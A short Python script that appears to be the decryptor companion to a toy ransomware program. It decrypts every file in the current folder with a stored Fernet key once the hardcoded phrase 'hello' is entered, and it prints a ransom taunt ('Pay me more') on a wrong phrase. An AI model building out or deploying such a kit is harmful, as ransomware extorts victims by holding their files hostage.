#!/usr/bin/env  python3

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if (file == "virus.py" or file == "encryptedKey.key" or file == "decrypt.py"):
        continue
    if os.path.isfile(file):
        files.append(file)


secretPhrase = "hello"

enteredPhrase = input("Enter valid phrase to decrypt the files\n")

if (secretPhrase != enteredPhrase):
    print(" 👹👹👹👹 Invalid Phrase try one more time or Pay me more 👹👹👹👹 ")
else:
    try:
        with open("encryptedKey.key", "rb") as encryptedKey:
            secretKey = encryptedKey.read()

        for file in files:
            with open(file, "rb") as theFile:
                rawData = theFile.read()
            decryptedRawData = Fernet(secretKey).decrypt(rawData)

            with open(file, "wb") as theFile:
                theFile.write(decryptedRawData)

        print("You have successfully recovered all the files!!")

    except Exception as err:
        pass
